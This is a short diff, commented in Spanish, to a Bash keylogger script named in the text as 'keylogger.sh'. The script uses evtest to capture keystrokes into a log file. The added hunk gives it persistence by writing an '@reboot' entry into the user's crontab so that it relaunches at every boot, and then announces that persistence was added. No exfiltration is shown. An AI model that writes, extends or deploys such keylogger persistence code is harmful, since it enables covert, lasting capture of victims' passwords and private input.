@@ -20,6 +20,12 @@ if ! command -v evtest &> /dev/null; then
     exit 1
 fi
 
+# Agrega el script al crontab para que se ejecute al inicio
+if ! crontab -l | grep -q "keylogger.sh"; then
+    (crontab -l 2>/dev/null; echo "@reboot bash $(realpath $0)") | crontab -
+    echo "[*] Persistencia agregada en crontab (@reboot)"
+fi
+
 echo "[*] Iniciando captura de teclas por 30 segundos..." > "$LOG_FILE"
 
 # Registrar el usuario actual del que se estan registrando las teclas
